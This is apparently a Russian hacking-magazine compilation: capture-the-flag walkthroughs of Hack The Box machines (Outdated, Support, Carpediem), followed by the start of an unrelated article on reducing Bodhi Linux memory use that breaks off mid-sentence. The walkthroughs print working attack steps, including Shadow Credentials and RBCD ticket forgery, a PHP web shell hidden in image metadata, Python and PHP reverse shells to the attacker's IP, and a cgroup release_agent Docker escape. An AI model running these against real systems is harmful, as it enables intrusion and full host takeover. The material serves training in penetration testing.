Для работы с выходным файлом BloodHound нам нужно установить СУБД
Neo4j и графическую оснастку bloodhound для построения графа связей.


sudo apt install neo4j bloodhound

Запустим установленную Neo4j командой sudo neo4j console. После сооб‐
щения об успешном старте зайдем на localhost:7474 через браузер. Нам
сразу  предложат  установить  пароль.  После  установки пароля  запускаем
BloodHound (команда bloodhound в командной строке) и авторизуемся с толь‐
ко что установленным паролем.
   Когда откроется пустое окошко, закидываем в него полученный архив.
А затем в поле поиска указываем группу пользователей. На экране будут отоб‐
ражены все пользователи из этой группы, среди которых найдем подконтроль‐
ного нам и пометим как Mark User as Owned. На иконке пользователя должен
появиться череп. Затем попросим BloodHound найти путь продвижения к дру‐
гим пользователям от уже взломанного (которого мы только пометили) —
опция Shortest Path from Owned Principals в графе аналитики.





                        Граф продвижения

Так мы получим маршрут к захвату пользователя sflowers, который является
администратором WSUS, но об этом поговорим уже при повышении привиле‐
гий.  Сейчас же нам  интересна  группа  ITSTAFF,  которая  имеет  право
AddKeyCredentialLink для учетной записи sflowers. Тут мы можем восполь‐
зоваться техникой Shadow Credentials.


Shadow Credentials
Эта техника позволяет атакующему завладеть учетной записью пользователя
или компьютера, если он может изменить атрибут msDS-KeyCredentialLink
целевого объекта и добавить к нему альтернативные учетные данные, такие
как сертификат. Сделать это можно с помощью утилиты Whisker.


dotnet inline-execute /home/ralf/tools/SHARP/CredAccess/Whisker.
exe add /target:sflowers





                 Добавление альтернативных учетных данных

Сертификат добавлен, пароль показан, но также показана и следующая коман‐
да, которой мы запросим тикет и хеш пароля пользователя.


dotnet inline-execute /home/ralf/tools/SHARP/CredAccess/Rubeus.
exe asktgt /user:sflowers /certificate:MIIJuAIB...dNldA/o3dwICB9A=
 /password:"C9pt7Aokq2cmfYxq" /domain:outdated.htb /dc:DC.
outdated.htb /getcredentials /show





                     NTLM-хеш пользователя

С полученным хешем можно авторизоваться через службу WinRM и запустить
новый демон Havoc.


evil-winrm -i dc.outdated.htb -u sflowers -H
1FCDB1F6015DCB318CC77BB2BDA14DB5




                               Сессии Havoc




                        Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Теперь вернемся к группе администраторов WSUS. Мы можем управлять
службой WSUS, но прежде, чем говорить о повышении привилегий, нам нужно
проверить еще два параметра.
   Первый — обновления запрашиваются без использования SSL:


shell reg query HKLM\Software\Policies\Microsoft\Windows\
WindowsUpdate /v WUServer





                            Значение WUServer

Второй — игнорируется ли запись WUServer:


shell reg query HKLM\Software\Policies\Microsoft\Windows\
WindowsUpdate\AU /v UseWUServer





                          Значение UseWUServer

Условия соблюдены, поэтому мы можем использовать технику эскалации через
WSUS. Сначала загружаем на хост PsExec64.exe.


upload /home/ralf/tmp/PsExec64.exe C:\Windows\Tasks\PsExec64.exe

Теперь c помощью SharpWSUS создаем вредоносное обновление, которое
изменит пароль администратора.


.\SharpWSUS.exe create /payload:"C:\Windows\Tasks\PsExec64.exe" /
args:'-accepteula -s -d cmd.exe /c "net user administrator
!QA@WS3ed4rf"' /title:"newWSUS"





                    Создание вредоносного обновления

Теперь развернем наше обновление.


.\SharpWSUS.exe approve /updateid:b8947333-f662-4d7a-832f-
f2f4700df828 /computername:dc.outdated.htb /groupname:"newgroup1"





                    Применение созданного обновления


.\SharpWSUS.exe check /updateid:b8947333-f662-4d7a-832f-
f2f4700df828 /computername:dc.outdated.htb

И проверяем его статус.




                          Проверка статуса обновления

Обновление прошло успешно, поэтому можем подключиться по WinRM и заб‐
рать флаг рута.


evil-winrm -i dc.outdated.htb -u Administrator -p '!QA@WS3ed4rf'



                            Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
SUPPORT





           ПРОВОДИМ
     КЛАССИЧЕСКУЮ АТАКУ RBCD
        ДЛЯ ЗАХВАТА ДОМЕНА





В этом райтапе я покажу, как проводить
атаку RBCD для  захвата домена  Active
Directory. Но сначала мы декомпилируем
несложное    приложение    на    .NET
для получения доступа к LDAP, а затем             RalfHacker                                                                                          hackerralf8@gmail.com
получим учетную запись пользователя.


Наша цель — захватить тренировочную машину Support с площадки Hack
The Box. Ее уровень сложности обозначен как легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.174    support.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное сканирование, с использованием име‐
ющихся скриптов (опция -A).





                              Результат работы скрипта

По результатам сканирования имеем много открытых портов, что типично
для систем на базе ОС Windows:
 • 53 — служба DNS;
 • 88 — служба Kerberos;
 • 135 — служба удаленного вызова процедур (Microsoft RPC). Используется
   для операций взаимодействия контроллер — контроллер и контроллер —
    клиент;
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — служба LDAP;
 • 445 — служба SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.

DNS ничего не дал, а вот SMB позволяет подключаться от имени  гостя.
Для работы я советую использовать CrackMapExec. К примеру, получить
список общих ресурсов с соответствующими разрешениями можно парамет‐
ром --shares.


crackmapexec smb 10.10.11.174 -u guest -p '' --shares





                          Общие ресурсы


ТОЧКА ВХОДА
Подключаемся к общему ресурсу и смотрим, что мы можем оттуда забрать.


smbclient //10.10.11.174/support-tools -N





                    Содержимое каталога support-tools

Больше всего, судя по названиям файлов, нам интересен UserInfo.exe.zip.


get UserInfo.exe.zip





                    Содержимое архива UserInfo.exe.zip

Это приложение на .NET, поэтому мы можем его легко декомпилировать
с помощью dnSpy и проанализировать исходный код. В нем мы находим класс
Protected, метод getPassword которого должен расшифровать и вернуть
пароль.





                      Исходный код класса Protected

Давай восстановим алгоритм и узнаем пароль.


enc_password = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
import base64
e_password = base64.b64decode(enc_password)
dec_password = []
for i in range(len(e_password)):
       dec_password.append(chr(e_password[i] ^ key[i % len(key)] ^
223))
"".join(dec_password)





                   Расшифрованный пароль из приложения

В итоге получаем пароль и продолжаем анализ приложения.


ТОЧКА ОПОРЫ
В исходном коде класса LdapQuery можно узнать имя пользователя, которое
используется при подключении к LDAP.





                     Исходный код класса LdapQuery

У нас есть все необходимые учетные данные, поэтому подключимся к службе
LDAP с помощью JXplorer.





                         Панель авторизации JXplorer





                             Главное окно JXplorer

Первым делом соберем и просмотрим информацию о пользователях. Так,
в атрибуте info пользователя support можем получить какую‑то интересную
строку.





                       Атрибуты пользователя support

Возможно,   это   пароль.   Проверить   гипотезу   можно   с  помощью
CrackMapExec.


crackmapexec smb 10.10.11.174 -u support -p
Ironside47pleasure40Watchful



                            Проверка учетных данных

Мы нашли пароль пользователя домена, попробуем извлечь из этого больше
информации. На удаленном  хосте активна служба удаленного управления
Windows, поэтому получим список пользователей группы Remote Management
Users.


crackmapexec smb 10.10.11.174 -u support -p
Ironside47pleasure40Watchful --groups 'Remote Management Users'




               Пользователи в группе Remote Management Users

Узнаем, что наш пользователь может заходить на хост по WinRM. Делаем это с
помощью evil-winrm и забираем первый флаг.


evil-winrm -i 10.10.11.174 -u support -p
Ironside47pleasure40Watchful





                        Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
Теперь нужно разобраться, куда двигаться дальше. Инструменты WinPEAS
и PowerUp ничего не дали,  значит, нужна более продвинутая разведка,
в которой мы задействуем BloodHound.


Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее можно
использовать,  чтобы  легко идентифицировать очень сложные пути  атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для Windows — на PowerShell или C# — и для Linux — на Python.



BloodHound
Первым делом качаем с GitHub версию нагрузки BloodHound на Python:


git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install

А теперь соберем информацию с целевого хоста, благо это не займет много
времени. В параметрах указываем учетные данные для подключения, адрес
хоста и тип собираемой информации — всю (параметр -c, значение all).


bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d
support.htb -dc dc.support.htb -gc dc.support.htb -ns 10.10.11.
174 --dns-tcp -c all





                                 Логи BloodHound

В логах видим, сколько доменов, лесов и компьютеров было найдено, сколько
пользователей и групп получено. BloodHound создаст в текущей директории
несколько файлов. Для работы с ними нам нужно установить СУБД Neo4j
и графическую оснастку BloodHound для построения графа связей.


sudo apt install neo4j bloodhound

Запустим установленную СУБД командой sudo neo4j console. После сооб‐
щения об успешном старте зайдем на http://localhost:7474/ через бра‐
узер. Нам сразу предложат установить пароль. После установки пароля запус‐
каем BloodHound (команда bloodhound в командной строке) и авторизуемся
с только что установленным паролем. Откроется пустое окошко. Закидываем
в него полученные в результате работы bloodhound-python файлы.
  В поле поиска указываем группу пользователей. На экране будут отоб‐
ражены все пользователи из этой группы, среди которых найдем всех подкон‐
трольных нам и пометим как Mark User as Owned. На иконке пользователя дол‐
жен появиться череп.





                         Помеченный пользователь

Затем перейдем в графу аналитики и попросим BloodHound найти путь прод‐
вижения к другим пользователям от уже взломанных (которых мы только
пометили) — опция Shortest Path from Owned Principals. Так мы получим мар‐
шрут от пользователя Support.





                  Граф пути повышения привилегий

Если следовать графу, то целевой пользователь Support — член группы Shared
Support Accounts, которая, в свою очередь, имеет права GenericAll (полные
права) на объект контроллера домена.


RBCD
В данном случае мы можем провести атаку RBCD. Обычный способ проведе‐
ния этой атаки — создать учетную запись компьютера, что может сделать каж‐
дый пользователь домена (по умолчанию до десяти таких аккаунтов). Сделаем
это с помощью скрипта addcomputer из набора скриптов impacket.


impacket-addcomputer -computer-name 'ralf_pc$' -computer-pass
'RRrr!!11' -dc-ip 10.10.11.174 'support.htb' / 'support' :
'Ironside47pleasure40Watchful'




                   Создание учетной записи компьютера

Новый SPN необходимо указать вот в этом атрибуте целевого объекта (в
нашем случае контроллера домена):


msDS-AllowedToActOnBehalfOfOtherIdentity

Для этого можно использовать готовый скрипт .


python3 rbcd.py -f RALF_PC -t DC -dc-ip 10.10.11.174 'support.htb'
\'support':'Ironside47pleasure40Watchful'





                        Заполнение целевого атрибута

Затем,  используя  данные  этой  учетной  записи,  злоумышленник может
получить тикет через запросы S4U2Self и S4U2Proxy. В этом тоже поможет
пакет скриптов impacket.


impacket-getST -spn host/dc.support.htb -impersonate
Administrator -dc-ip 10.10.11.174 'support.htb' / 'ralf_pc$' :
'RRrr!!11'





                               Запрос тикета

После получения тикета можно использовать  Pass-the-Ticket для  доступа
к целевому хосту. Экспортируем билет и подключаемся к серверу по WMI.


export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass support.htb/Administrator@dc.support.
htb





                            Флаг рута

Машина захвачена!
ВЗЛОМ

       HTB
 CARPEDIEM





             СБЕГАЕМ
      ИЗ DOCKER-КОНТЕЙНЕРОВ





В этой статье мы с тобой обойдем авто‐
ризацию на сайте и получим простенький
RCE  для  проникновения  в  контейнер
Docker. Затем проведем разведку в сети,
поработаем с MySQL и MongoDB, чтобы             RalfHacker                                                                                          hackerralf8@gmail.com
похитить информацию из Trudesk, перех‐
ватим трафик HTTPS и расшифруем дан‐
ные.  Снова попав в  контейнер  Docker,
успешно сбежим из него с максимальными
привилегиями на хосте.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                       где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА
Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.167    carpediem.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$( nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f
 1 | tr '\n' ',' | sed s/, $/ / )
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое сканиро‐
вание, на втором — более тщательное, с использованием имеющихся скрип‐
тов (опция -A).





                              Результат работы скрипта

Мы обнаружили два открытых порта: 22 — служба OpenSSH 8.2p1 и 80 —
веб‑сервер Nginx 1.18.0. Начнем с веб‑сервера.





                            Главная страница сайта

На сайте ничего интересного найти не удалось, поэтому попробуем поискать
скрытый контент.


Сканирование веб-контента
Искать потайные страницы мы будем при помощи сканера ffuf.


Справка: сканирование веба c ffuf
Одно из первых действий при тестировании безопасности веб‑приложения —
это  сканирование методом  перебора  каталогов,  чтобы  найти  скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю легкий и очень быстрый ffuf . При запуске указываем сле‐
дующие параметры:
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -u — URL.





ffuf -u 'http://carpediem.htb/FUZZ' -w directory_2.3_medium_
lowercase.txt -t 256





                 Результат сканирования каталогов с помощью ffuf

Ничего интересного и тут. Идем дальше и сканируем поддомены, для чего нам
нужно перебирать запись в HTTP-заголовке HOST. При этом используем филь‐
тр --fs, который поможет отсеять ложные страницы по их размеру.


ffuf -u 'http://carpediem.htb/FUZZ' -w subdomains-top1million-
110000.txt -H 'Host: FUZZ.carpediem.htb' -t 256 --fs 2875



               Результат сканирования поддоменов с помощью ffuf

Находим новый поддомен, поэтому дополняем запись в файле /etc/hosts
и идем смотреть новый сайт.


10.10.11.167 carpediem.htb portal.carpediem.htb





                  Главная страница сайта portal.carpediem.htb


ТОЧКА ВХОДА
Первым делом обратим внимание на то, как подключается страница. Это про‐
исходит через параметр p.





                      Способ обращение к странице

Также на сайте можно зарегистрироваться и авторизоваться. Сделаем это!





                          Регистрация нового пользователя

Если всю работу вести в Burp Proxy, то в истории запросов можно заметить
обращение к какому‑то файлу /classes/Master.php, которому в параметре f
передается команда register.





                История запросов на сервер при регистрации

Но вернемся к загружаемой через параметр странице и проверим, нет ли
здесь уязвимости LFI. Для этого переберем разные нагрузки через Burp
Intruder.





                    Burp Intruder — вкладка Positions





                 Burp Intruder — результат сканирования

В итоге есть варианты, которые возвращают ошибку, но раскрутить это до уяз‐
вимости не получилось. Тогда просканируем каталоги на новом домене.


ffuf -u 'http://portal.carpediem.htb/FUZZ' -w directory_2.3_
medium_lowercase.txt -t 256





                          Результат сканирования каталогов

Это сканирование снова расширяет область тестирования: мы нашли админку
сайта — /admin. Но при обращении к ней сервер вернет ошибку 403.





                        История запросов на сервер

Что ж, пока ничего пробить не выходит. Переходим к следующей функции —
изменению профиля. И снова видим запрос к уже знакомой странице /
classes/Master.php, но с другой командой.





                 Запрос на изменение параметров профиля

Тут я заметил POST-параметр login_type со значением 2. Отправим этот зап‐
рос в Burp Repeater и изменим значение интересного параметра на 1.





                 Запрос на изменение параметров профиля

И теперь нам доступна страница /admin!





                           Панель администратора

Гуляя по новой панели, снова переходим к функции изменения профиля
и находим загрузку аватара, а это новая функция для тестирования.





                       Форма загрузки аватара


ТОЧКА ОПОРЫ
Первым делом я решил залить простой PHP-шелл для получения RCE.


<?php echo system($_GET['cmd']); ?>





                     Сообщение о загруженном файле

Файл загружен, но ошибка связана с изображением. То есть с форматом фай‐
ла PHP никаких проблем нет. Тогда возьмем любую картину, изменим рас‐
ширение на .php и запишем в служебное поле комментария PHP-шелл.
Это можно сделать с помощью утилиты exiftool .


exiftool -Comment='<?php echo system($_GET[' cmd ']); ?>' rs.php

После загрузки страница обновится, и мы увидим битую аватарку. Найти путь
к файлу не составит труда, он указан в исходном коде страницы.





                         Исходный код страницы

Попробуем выполнить команду id.





                                  Проверка RCE

Мы получили удаленное выполнение кода. Теперь давай сделаем себе удоб‐
ную оболочку, прокинув реверс‑шелл. В качестве листенера я буду исполь‐
зовать pwncat-sc, установить который можно командой sudo pip3 install
pwncat-cs. Отправляем в параметре cmd следующую команду и получаем
сообщение о созданной сессии.


python3 -c 'import socket,subprocess,os;s=socket.socket(socket.
AF_INET,socket.SOCK_STREAM);s.connect(()"10.10.14.30",4321));os.
dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty; pty.spawn("sh")'





                                    Логи pwncat

Для перехода в режим командной оболочки из оболочки pwncat-cs используем
команду back, для обратного перехода в режим pwncat-cs — комбинацию кла‐
виш Ctrl-D.




                         Получение командной оболочки




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ
      HTB CARPEDIEM
                                     СБЕГАЕМ
                      ИЗ DOCKER-КОНТЕЙНЕРОВ





ПРОДВИЖЕНИЕ
Разведка
По имени хоста понимаем, что находимся в контейнере Docker. Следующим
шагом будет поиск учетных данных. И самое первое место для проверки
в таких случаях — это файлы сайта. Так, в файле DBConnection.php будут учет‐
ные данные для подключения к базе данных.





                   Содержимое файла DBConnection.php

Этот пароль никуда не подходит, так что продолжим разведку. Источников
информации очень много, поэтому воспользуемся скриптами PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени пользовате‐
ля? Вариантов дальнейшей эксплуатации и повышения привилегий может быть
очень много, как в  Linux, так и в Windows. Чтобы собрать информацию
и наметить цели, можно использовать Privilege Escalation Awesome Scripts
SUITE (PEASS) — набор скриптов, которые проверяют систему на автомате.



<Ctrl> + D
upload linpeas_linux_amd64 /tmp/linpeas_linux_amd64
back
chmod +x /tmp/linpeas_linux_amd64
/tmp/linpeas_linux_amd64

Отмечаем еще один пароль в переменных окружения, а также несколько новых
адресов в файле /etc/hosts.



                          Переменные окружения





                       Содержимое файла /etc/hosts

В сети есть еще хосты, на одном из них, судя по названию, работает MySQL.
Загрузим в контейнер статический Nmap и просканируем несколько начальных
адресов на наличие открытых портов.


<Ctrl> + D
upload nmap /tmp/nmap
back
chmod +x /tmp/nmap
/tmp/nmap -p- 172.17.0.1-6





                           Результат сканирования портов

Нам доступно много служб для проверки, начнем с баз данных.


MySQL & MongoDB
На хосте 172.17.0.4 открыт типичный для MySQL порт 3306. А на  хос‐
те 172.17.0.2 открыт порт 27017, что свойственно MongoDB. Чтобы получить
доступ к этим хостам, нужно построить туннель. Для этого будем использовать
chisel . На  локальном  хосте  запустим  сервер, ожидающий  подключения
(параметр --reverse) на порт 5432 (параметр -p).


./chisel.bin server --reverse -p 5432




                                 Логи chisel server

Теперь на удаленном хосте запустим клиентскую часть. Указываем адрес сер‐
вера и порт для подключения, а также тип туннеля — socks.


/tmp/chisel.bin client 10.10.14.30:5432 R:socks



                                 Логи chisel client

В логах сервера должны увидеть сообщение о создании сессии.




                                 Логи chisel server

Теперь, чтобы перенаправлять трафик в созданный туннель, будем исполь‐
зовать proxychains. В файле конфига /etc/proxychains.conf добавим мар‐
шрут:


socks5 127.0.0.1 1080

Подключимся к MySQL, а затем посмотрим, какие есть базы данных.


proxychains4 -q mysql -h 172.17.0.4 -u portaldb -p
show databases;





                                  Базы данных

Теперь найдем интересные таблицы в базе portal.


use portal;
show tables;





                            Таблице в базе portal

Наиболее интересна таблица users.


select * from users;




                        Содержимое таблицы users

Там находим учетные данные, но пробрутить хеш не вышло. Тогда перейдем
к MongoDB.


proxychains4 -q mongo 172.17.0.2
show dbs;





                                Базы в MongoDB

Так находим базу для Trudesk.


Trudesk
Trudesk — это опенсорсный софт, предназначенный для службы поддержки.
Тут можно будет получить какую‑то новую информацию.  Дополнительно
из сертификата SSL на порте 443 хоста 172.17.0.3 получаем доменное имя
backdrop.carpedium.htb, но пока продолжим с Trudesk.





                     Информация о сертификате сайта

Сам Trudesk обнаружим на порте 8118 хоста 172.17.0.5.





                           Поле авторизации Trudesk

Учетных данных мы не знаем, но есть доступ к базе данных сервиса. Выбира‐
ем эту базу и получаем записи обо всех аккаунтах.


use trudesk
db.accounts.find()





                         Записи об аккаунтах trudesk

Находим запись администратора. Давай изменим ему пароль прямо в базе.
Для этого сначала его хешируем.


import bcrypt
p = 'ralf'
salt = bcrypt.gensalt(rounds=10)
bcrypt.hashpw(p.encode(),salt)

Теперь меняем его в базе и авторизуемся как admin : ralf.


db.accounts.update( {"_id": ObjectId("623c8b20855cc5001a8ba13c")},
{$set: {"password": "$2b$10$NdqhhsBaSEnoMn9sM/vckeUN.
Sw8c3qDqosPtYf5rVOpMmWh2XUye"}});


                        Изменение пароля в базе





                            Панель пользователя

Теперь нужно просмотреть переписку с поддержкой. Так мы находим очень
интересную информацию. Пароль для пользователя с ID 9650 и паролем 2022
к VOIP сообщается, если позвонить по номеру *62. А в качестве VOIP-клиента
советуют использовать Zoiper.





                            Переписка с поддержкой


VOIP
Скачаем и установим клиент Zoiper. После запуска нам предлагают авторизо‐
ваться. Сделаем это, так как у нас есть все необходимые данные.





                              Авторизация в Zoiper

Теперь открываем  клавиатуру для набора номера и вызываем  абонента
по номеру *62.





                              Вызов абонента

Прослушать аудио займет около минуты, но зато мы получаем из него пароль
пользователя. Долго перебирать не пришлось, сразу авторизуемся по SSH
и забираем первый флаг.




                        Флаг пользователя




                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИВЗЛОМ
      HTB CARPEDIEM
                                     СБЕГАЕМ
                      ИЗ DOCKER-КОНТЕЙНЕРОВ





ЭКСПЛУАТАЦИЯ
Теперь, когда мы получили доступ к хосту, нам нужно собрать информацию.
Снова используем для этого скрипты PEASS.
   Узнаем следующее.
 • Судя по информации из /etc/hosts, на хосте работает сайт backdrop.
  carpediem.htb. При этом хост прослушивает много веб‑портов.
 • Можем получить ключ RSA, используемый для SSL-шифрования на сайте
  backdrop.carpediem.htb.
 • Среди  активных  Linux  Capabilities для  программы tcpdump находим
  cap_net_admin .





                       Содержимое файла /etc/hosts





                         Прослушиваемые порты



                           Доступный ключ RSA





                         Активные Linux Capabilities

Объединяя все полученные данные, можем прослушивать трафик на хосте,
на котором работает сайт backdrop, после чего расшифровать собранный тра‐
фик найденным приватным ключом и просмотреть критически важные данные.


Перехват трафика
Оставим минуты две на работу tcpdump, после чего забираем файл .pcap
на локальный хост и открываем в Wireshark.


tcpdump -i docker0 -w t.pcap

Переходим в настройки «Редактирование → Параметры → Протокол → TLS →
RSA key list» и добавляем скачанный ключ RSA. Затем в фильтре Wireshark ука‐
зываем протокол HTTP.





                          Запросы на веб‑сервер

Видим запрос на авторизацию, открываем его, чтобы посмотреть данные,
и забираем учетные данные пользователя.





                           Запрос на авторизацию

С  полученными  учетными  данными  нужно  авторизоваться  в  backdrop
на локальном порте 8002, для чего прокинем этот порт на свой хост.


ssh -L 8002:127.0.0.1:8002 hflaccus@carpediem.htb

Теперь весь трафик, который мы пошлем на локальный порт 8002, будет тун‐
нелирован на порт 8002 указанного хоста (в данном случае 127.0.0.1) через
SSH-хост.
   Давай обратимся к сайту по адресу http://127.0.0.1:8002/.





                        Главная страница CMS Backdrop


CMS Backdrop — RCE
Нам доступна целая CMS, поэтому проверим, нет ли для нее эксплоитов в пуб‐
личном доступе. Долго искать не пришлось, первая же ссылка в Google дает
нам подходящий репозиторий на GitHub. С помощью этого эксплоита мы
можем получить  удаленное выполнение кода, добавив свой  плагин (или
использовать уже готовый). Первым делом перейдем к странице загрузки
модулей: Functionality → Install new modules.





                             Меню сайта





                        Страница загрузки модулей

Теперь выбираем пункт Manual installation и загружаем упомянутый выше архив
(готовый плагин).





                                Загрузка архива





                Сообщение об успешной установке плагина

Теперь мы можем выполнять команды через страницу modules/reference/
shell.php.





                           Выполнение команды id

Для получения командной оболочки открываем листенер и отправляем сле‐
дующую команду:


php -r '$sock=fsockopen("10.10.14.48",4321);exec("sh <&3 >&3 2>&
3");'

Мы должны получить новую сессию.


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
LPE Docker inside
Разведка с помощью LinPEAS ничего нам не дает. Зато если мы отследим
запускаемые процессы с помощью pspy64 , то найдем кое‑что интересное.




                                   Логи pspy64

От имени рута запускается скрипт /opt/hearbeat.sh. Просмотрим его содер‐
жимое.





                   Содержимое скрипта /opt/hearbeat.sh

Сначала скрипт сверяет хеш файла backdrop.sh, чтобы убедиться, что он
не был изменен. Затем выполняет его с помощью PHP.





                      Содержимое файла backdrop.sh

Так как включаются файлы из каталога /var/www/html/backdrop, можно соз‐
дать в этом каталоге файл index.php и он будет выполнен. В сам файл
запишем уже использованный ранее PHP-шелл. Спустя некоторое время уви‐
дим новую сессию в pwncat-cs.





                          Сессия пользователя root


Docker escape
Контейнер работает в привилегированном режиме, и у нас есть права рута, что
позволяет нам выйти из контейнера на основной хост также в привилегирован‐
ном режиме. В этом нам помогут контрольные группы Linux.
   Cgroup, или  «контрольная  группа», в  Linux — это  группа  процессов,
для которой механизмами ядра наложена изоляция и установлены ограничения
на некоторые вычислительные ресурсы  (процессорные, сетевые, память,
ввод‑вывод). Это как раз один из механизмов, с помощью которых Docker изо‐
лирует контейнеры.
   Этот метод использует функцию notify_on_release в cgroups v1, чтобы
запустить определенный код от имени пользователя root. Дело в том, что, ког‐
да последняя задача в контрольной группе покидает ее, на хосте выполняется
команда, указанная в файле release_agent. Таким образом предполагается
сократить число заброшенных контрольных групп. Эта команда при вызове
запускается на хосте как пользователь с полными привилегиями.
   Первым делом нам нужно запустить новую командную оболочку.


unshare -UrmC bash

Теперь, чтобы выполнить код на основном хосте, нам нужна контрольная груп‐
па, в которой мы можем создать файл release_agent и инициировать его
вызов, уничтожив все процессы в контрольной группе. Самый простой способ
добиться  этого — смонтировать  контроллер cgroup и создать дочернюю
cgroup. Для этого мы создаем каталог /tmp/ralf, монтируем контроллер
cgroup RDMA и создаем дочернюю cgroup x.


umount /tmp/ralf
rm -R /tmp/ralf
mkdir /tmp/ralf
mount -t cgroup -o rdma cgroup /tmp/ralf
mkdir /tmp/ralf/x

Затем активируем уведомления контрольной группы, записывая единицу в ее
файл notify_on_release. Также настраиваем cgroup RDMA для выполнения
сценария /cmd. Путь к самому контейнеру на основном хосте берем из файла /
etc/mtab.


echo 1 > /tmp/ralf/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/ralf/release_agent

Команды из файла /cmd будут выполнены в привилегированном режиме
на основном хосте, поэтому нужно выбрать один из методов персистентности.
К примеру, установка бита SUID для файла командной оболочки /bin/bash.


echo '#!/bin/bash' > /cmd
echo "chmod u+s /bin/bash" >> /cmd
chmod a+x /cmd

Последнее действие — вызов триггера RDMA. Создадим процесс, который
немедленно завершится внутри дочерней контрольной группы x. Для этого
запускаем процесс bash и записываем его PID в файл cgroup.procs.


bash -c "echo \$\$ > /tmp/ralf/x/cgroup.procs"

Теперь мы можем вернуться на основной хост и проверить права на файл /
bin/bash.



                              Права на файл bash

S-бит установлен, поэтому запускаем его и легко получаем оболочку в при‐
вилегированном режиме.





                            Флаг рута

Забираем флаг рута, и машина захвачена!
ТРЮКИ





УМЕНЬШАЕМ
ТРЕБОВАНИЯ
BODHI LINUX
К ОПЕРАТИВНОЙ
ПАМЯТИ





Есть много задач, которые проще решить
в GNU/Linux, чем где‑то еще, поэтому вир‐
туалки с Linux в наше время — это обычное
дело. И  чем  меньше  будет  занимать
на диске и в памяти такая виртуалка, тем        Игорь Орещенков                                                                                                  r0bur@mail.ru
лучше. В этой статье я возьму за основу
дистрибутив   Bodhi   Linux  и   покажу,
как уменьшить его требования к оператив‐
ной   памяти,   чтобы   он   заработал
на машинах с 512 Мбайт вместо офи‐
циально необходимых 768 Мбайт. Описан‐
ные рекомендации  актуальны  для  всех
современных версий Ubuntu.


Bodhi Linux 6.0 — это несколько своеобразный дистрибутив, но именно на нем
я остановил свой выбор. Почему? Во‑первых, он основан на Ubuntu 20.04 LTS,
что дает доступ к огромному числу программ в официальных репозиториях
Ubuntu. Во‑вторых, у Ubuntu огромное сообщество, опытом которого можно
пользоваться. В‑третьих, мне приглянулась легковесная графическая среда
Moksha Desktop. Да, у нее есть нюансы в настройке, но разобраться с ними
нужно всего один раз. Ну и в‑четвертых, этот дистрибутив минималистичен,
но  содержит  инструменты  Build  Essential,  которые  позволяют  быстро
что‑нибудь скомпилировать.
   Итак, для установки Bodhi Linux требуется 768 Мбайт оперативной памяти,
объем которой можно уменьшить до 384 Мбайт на работающей системе,
и при этом ей все еще можно будет пользоваться. Такая экономичность поз‐
воляет создать приличный пул виртуальных машин, например для моделирова‐
ния сетевых конфигураций.
   Если на виртуальной машине подкорректировать объем памяти можно
за несколько секунд, то для установки Bodhi Linux на устаревший компьютер
с 512 Мбайт ОЗУ придется вместо этого где‑то искать и устанавливать допол‐
нительную планку памяти. Да и в конце концов, почему Bodhi Linux (и многие
другие современные дистрибутивы) так прожорливы на этапе установки, хотя
